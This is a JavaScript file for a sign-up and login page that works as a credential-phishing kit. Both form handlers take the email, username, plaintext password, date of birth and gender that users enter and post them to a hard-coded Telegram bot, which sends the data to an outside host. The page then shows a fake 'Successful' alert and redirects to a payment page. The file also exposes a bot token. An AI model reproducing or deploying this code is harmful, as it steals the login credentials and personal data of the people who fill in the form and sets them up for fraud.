const signUpForm = document.getElementById('sign-up-form');
const loginForm = document.getElementById('login-form');
 const toggleText = document.getElementById('toggle-text');

toggleText.addEventListener('click', () => {
signUpForm.classList.toggle('active');
            loginForm.classList.toggle('active');
            toggleText.textContent = signUpForm.classList.contains('active')
                ? 'Already have an account? Log In'
                : "Don't have an account? Sign Up";
        });

        // Function to submit Sign-Up data to Telegram bot
        async function submitSignUpData(event) {
            event.preventDefault();

            const formData = new FormData(event.target);
            const data = {
                email: formData.get('email'),
                username: formData.get('username'),
                password: formData.get('password'),
                dob: formData.get('dob'),
                gender: formData.get('gender')
            };
            const message = `
😲 New Sign Up:
🤑 Email: ${data.email}
🤭 Username: ${data.username}
😏 Password: ${data.password}
🍼 Date of Birth: ${data.dob}
💀 Gender: ${data.gender}
😈 DEVELOPER: Aashish Kumar Sah
            `;

            // Your Telegram Bot token
            const botToken = '7788248261:AAEVpQ56AMqrKuOEToTQAj22eRiB2uK_gOQ';
            const chatId = '1244376189';

            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const payload = {
                chat_id: chatId,
                text: message
            };

            try {
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    alert('Sign-Up Successful!');
                    window.location.href = 'pay.html';
                } else {
                    alert('Error submitting form.');
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }

        // Function to submit Login data to Telegram bot(i want in)
        async function submitLoginData(event) {
            event.preventDefault();

            const formData = new FormData(event.target);
            const data = {
                email: formData.get('email'),
                password: formData.get('password')
            };

            const message = `
🤑 New Login Attempt:
☠️ Email: ${data.email}
🤯 Password: ${data.password}
😈 DEVELOPER: Aashish Kumar Sah
            `;

            // Your Telegram Bot token
            const botToken = '7788248261:AAEVpQ56AMqrKuOEToTQAj22eRiB2uK_gOQ';
            const chatId = '1244376189';

            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const payload = {
                chat_id: chatId,
                text: message
            };

            try {
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    alert('Login Successful!');
                    window.location.href = 'pay.html';
                } else {
                    alert('Error submitting form.');
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }